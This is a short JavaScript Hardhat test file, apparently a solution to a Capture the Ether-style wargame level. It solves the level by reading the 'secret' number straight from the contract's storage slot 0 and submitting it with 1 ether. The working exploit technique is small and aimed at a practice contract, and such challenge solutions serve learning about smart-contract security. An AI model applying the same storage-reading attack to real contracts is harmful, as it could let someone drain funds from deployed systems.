const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require('path');
const util = require("../utils.js")

var scriptName = path.basename(__filename);

const CHALLENGE_ADDRESS = "0x21F4D468522A6FE583fEca2B217e60741BF8f751";

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const factory = await ethers.getContractFactory(
    "GuessTheRandomNumberChallenge"
  );
  contract = factory.attach(CHALLENGE_ADDRESS);
});

it("GuessTheRandomNumber", async function () {
  const ans = await ethers.provider.getStorageAt(
    CHALLENGE_ADDRESS,
    0
  );
  const tx = await contract.guess(ethers.BigNumber.from(ans), {
    value: ethers.utils.parseEther("1.0"),
  });
  await tx.wait();

  var isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
  util.updateTotalPoints(scriptName)
});
